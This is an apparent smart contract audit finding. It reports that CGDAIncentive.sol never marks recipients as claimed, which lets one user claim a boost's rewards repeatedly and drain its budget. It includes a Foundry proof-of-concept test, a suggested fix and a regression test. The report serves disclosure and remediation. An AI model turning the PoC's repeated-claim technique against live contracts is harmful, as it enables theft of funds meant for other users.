...
# Any user can claim reward multiple times on a `CGDAIncentive` boost reducing reward of other legitimate users

### Summary

When a boost is created to incentivize users following the Continuous Gradual Dutch Auction style as defined in `CGDAIncentive.sol`, a user can claim multiple times, leading to unfair reward left for other legitimate users.

### Root Cause

As depicted in the function `CGDAIncentive::_isClaimable`, there is a condition to check that each recipient can only claim the reward once: `!claimed[recipient_]`. 
...
However, the array `claimed` is not updated in the function `CGDAIncentive::claim`: https://github.com/sherlock-audit/2024-06-boost-aa-wallet/blob/main/boost-protocol/packages/evm/contracts/incentives/CGDAIncentive.sol#L88
As a result, any user can claim multiple times until the total budget for reward has finished.
...
1. An attacker just need to wait for a boost that follows the `CGDAIncentive` style
2. Participate in the boost
3. Then claim his reward multiple times. He just need to vary the claim amounts so that the claimData is different every time.

### Impact

The malicious user can drain a budget as he can keep claiming rewards. Hence, other legitimate users are left with way lower reward to claim.


### PoC

This file `EndToEndSignerValidator_CGDA.t.sol` can be added to `evm/test/e2e` folder. Then, run the test with the following command: `forge test --mt test__As_a_user_claim_multiple_times --via-ir -vvvv`
...
contract EndToEndSigner_CDGA is Test, OwnableRoles {
    ...
    uint256 rewardDecay = 0.05 ether;
    uint256 rewardBoost = 0.1 ether;
    uint256 totalBudget = 10 ether;
    ...
    function setUp() public {
        ...
        registry.register(BoostRegistry.RegistryType.INCENTIVE, "CGDAIncentive", address(new CGDAIncentive()));
        ...
        _budget = _given_that_I_have_a_budget(); // e get a budget and configure authorized addresses
    }

    function test__As_a_user_claim_multiple_times() public {
        address claimer = makeAddr("claimer");
        // the inital balance of the claimer is 0
        assertEq(erc20.balanceOf(claimer), 0);

        uint256 claimAmount = 0.5 ether;
        uint256 anotherClaimAmount = 1 ether;
        ...
        // claim an amount of 0.5 tokens
        bytes memory claimBytes = abi.encode(claimAmount);

        // claim an amount of 1 tokens
        bytes memory anotherclaimBytes = abi.encode(anotherClaimAmount);
        ...
        // create Validator Payload containing AIncentive Payload
        bytes32 anotherMsgHash = SignerValidator(address(boost.validator)).hashSignerData(
            boostId, incentiveQuantity, claimer, anotherclaimBytes
        );

        bytes memory signature = _signHash(msgHash, validatorSignerKey);
        bytes memory anotherSignature = _signHash(anotherMsgHash, validatorSignerKey);
        ...
        ASignerValidator.SignerValidatorInputParams memory anotherValidatorData =
            ASignerValidator.SignerValidatorInputParams(validatorSigner, anotherSignature, incentiveQuantity);
        bytes memory anotherClaimData =
            abi.encode(IBoostClaim.BoostClaimData(abi.encode(anotherValidatorData), anotherclaimBytes));

        // pass it into claimIncentive
        startHoax(claimer);
        core.claimIncentive{value: core.claimFee()}(boostId, incentiveId, address(0), claimData);
        core.claimIncentive{value: core.claimFee()}(boostId, incentiveId, address(0), anotherClaimData);

        assertGt(erc20.balanceOf(claimer), claimAmount + anotherClaimAmount);
    }
    ...
    function _when_I_create_a_new_boost_with_my_budget(ABudget budget) internal returns (BoostLib.Boost memory) {
        ...
        incentives[0] = BoostLib.Target({
            ...
            instance: address(
                registry.getBaseImplementation(
                    registry.getIdentifier(BoostRegistry.RegistryType.INCENTIVE, "CGDAIncentive")
                )
            ),
            parameters: abi.encode(erc20, initialReward, rewardDecay, rewardBoost, totalBudget)
        });
...
It's mandatory to update the array `claimed` on `CGDAIncentive.sol` to make sure that any recipient can only claim reward once.
The following change can be applied to `CGDAIncentive.sol`:
...
The following test case can also be added to `evm/test/incentives/CDGAIncentive.t.sol` to prevent this issue in the future:

```javascript

function test_anAccountCantClaimMultipleTime() public {
        address[] memory accounts = _randomAccounts(1);
        incentive.claim(accounts[0], hex"");
        // accounts[0] should be able to claim only once
        assertEq(incentive.isClaimable(accounts[0], hex""), false);
        vm.expectRevert();
        incentive.claim(accounts[0], hex"");
}
